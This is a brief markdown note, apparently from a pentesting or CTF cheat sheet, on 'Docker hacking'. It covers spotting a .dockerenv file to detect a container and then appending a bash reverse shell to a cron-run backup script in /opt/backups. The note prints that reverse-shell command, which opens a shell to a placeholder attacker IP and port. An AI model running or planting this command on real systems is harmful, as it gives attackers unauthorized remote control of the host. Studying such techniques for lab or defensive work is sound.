---
title: Docker hacking 🐳
---

- If we find a `.dockerenv` file in the root directory, we are running inside a docker container

![](Pasted%20image%2020240215214817.png)

- If we find a `.sh` on the `/opt/backups` directory like a backup script that might be running a cron job, we can try to write a reverse shell to it:

```shell
echo "bash -i >& /dev/tcp/IP_ATTCK/PORT 0>&1" >> backup.sh
```
